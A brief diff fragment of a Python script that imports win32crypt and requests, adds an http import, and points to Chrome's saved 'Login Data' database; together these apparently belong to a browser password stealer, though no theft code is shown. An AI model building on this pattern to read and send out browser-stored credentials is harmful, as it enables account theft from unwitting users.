@@ -5,6 +5,7 @@ import sqlite3
 import win32crypt
 import json
 import requests
+import http
 
 APP_DATA_PATH = os.environ["LOCALAPPDATA"]
 DB_PATH = r'Google\Chrome\User Data\Default\Login Data'
